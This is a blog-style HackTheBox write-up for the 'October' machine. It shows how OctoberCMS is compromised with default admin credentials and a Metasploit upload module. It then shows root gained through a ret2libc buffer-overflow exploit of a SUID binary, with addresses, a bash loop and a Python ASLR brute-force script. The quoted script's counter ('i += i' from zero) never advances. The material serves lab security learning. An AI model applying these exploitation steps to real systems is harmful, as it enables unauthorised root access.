---
layout: post
title:  "Hackthebox - October"
date:   2020-08-08 19:24:55 -0700
categories: hackthebox writeups medium
tags: hackthebox ctf october webshell ubuntu linux bof exploit file-upload nmap ret2libc  
---

This is a medium box made by ch4p which was super awesome because of the user to root privesc where you had to exploit a SUID binary running as root vulnerable to the ret2libc attack. We also had to do ASLR bruteforcing as it was enabled on the box.

First up I ran an nmap scan, 2 ports were revealed:

```bash
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: October CMS - Vanilla
```

First up we got ssh on port 22, nmap tells us the box runs Ubuntu based on it.

We also see a HTTP port open which runs OctoberCMS under Apache

![image](/assets/images/htb_october_80.png)

I fired up metasploit and searched for modules related to octobercms and found one which uploads a php file and executes it

![image](/assets/images/htb_october_msf.png)

As it was asking for creds I decided to use the default one's which are `admin:admin`, and to my surprise I got a shell as www-data, which had access to the `user.txt` file, this way we owned user

![image](/assets/images/htb_october_shell.png)

By searching for SUID files I found `/usr/local/bin/ovrflw`

![image](/assets/images/htb_october_suid.png)

I was able to trigger a segmentation fault by sending 500 A's using python

![image](/assets/images/htb_october_rseg.png)

I then downloaded the binary to my box using `meterpreter`'s `download` command and tried triggering a segfault there too

![image](/assets/images/htb_october_lseg.png)

Using gdb-peda I generated a pattern of 2000 bytes 

![image](/assets/images/htb_october_pat.png)

Then I ran the binary...

![image](/assets/images/htb_october_pedaseg.png)

This caused a seg fault, I used `pattern_search` I was able to identify EIP's offset being `112`, this is very important.

Aftering doing more research I found out that a ret2libc payload should be as following:

![image](https://cdn.discordapp.com/attachments/670978545379704863/742355039661588500/unknown.png)

So

```py
payload = junk + system_address + exit_address + binsh_address
```

We already know our junk should be `112` bytes, we can define it as following:

```py
junk = "A" * 112
```

I went back to the box to get the libc address (which we will need later), `/bin/sh`'s address, exit's address and system's address

Address of libc:

```bash
www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75f8000)
```

So 

```py
libc_address = 0xb75f8000
```

Finding the address of exit and system is easy

We find their offsets: 

```bash
www-data@october:/dev/shm$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
```

In my case:

`0x33260` - exit

`0x40310` - system

Then we grab the base address of libc, which was `0xb75f8000`, and then we add that to our offsets

LIBC            + OFFSET        = ADDRESS

`0xb75f8000`    + `0x33260`     = **0xB762B260** (_exit_)

`0xb75f8000`    + `0x40310`     = **0xB7638310** (_system_)

Next up we need to find the address of `/bin/sh`

```
www-data@october:/dev/shm$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh" 
 162bac /bin/sh
```

Again the offset is `162bac`, we can find it same way as others

LIBC            + OFFSET        = ADDRESS

`0xb75f8000`    + `162bac`     = **0xB775ABAC** (_/bin/sh_)

After finding all addresses I built a shell script which would continously ran the binary using our payload generated by python, as ASLR is enabled we would have a chance that the addresses would match our payload's addresses, giving us a /bin/sh shell as whoever was running the binary, in our case `root` because the binary has SUID.

```bash
while true
do 
./ovrflw `python -c "print \"\x90\"*112 + \"SYSTEM ADDRESS IN LITTLE ENDIAN FORMAT\" + \"EXIT ADDRESS IN LITTLE ENDIAN FORMAT\" + \"BIN/SH IN LITTLE ENDIAN FORMAT\""`
done
```

If you want to use python for this, here is enox's solution:

```py
#!/usr/bin/env python

import struct
from subprocess import call

offset="A"*112

libc_baseaddr = 0xb75e0000
system_off = 0x00040310
exit_off = 0x00033260
command_off = 0x00162bac #/bin/sh

system_addr = struct.pack("<I",libc_baseaddr+system_off)
exit_addr = struct.pack("<I",libc_baseaddr+exit_off)
command_addr = struct.pack("<I",libc_baseaddr+command_off)

payload = offset + system_addr + exit_addr + command_addr

i = 0
while (i < 512):
    print "Try : %s" %i
    i += i
    ret = call(["/usr/local/bin/ovrflw", payload])
```

If you don't know how to convert hex to little endian, here's are few ways:

![image](https://metahash.zendesk.com/hc/article_attachments/360014619234/Little_endian.jpg)

So `0x12345678` would be `\x78\x56\x34\x12` in python 

Alternatively you can use the struct module from python, example from enox's code would be this

```py
system_addr = struct.pack("<I",libc_baseaddr+system_off)
```

So this

```py
struct.pack("<I", 0x12345678)
```

Would convert `0x12345678` to little endian

Credits:
- [https://metahash.zendesk.com/hc/en-us/articles/360010374753-Little-endian-format](https://metahash.zendesk.com/hc/en-us/articles/360010374753-Little-endian-format) - For the image
- Enox for the code
- 0xdf for helping me learn how to brute force aslr and some snippets of text from his blog :P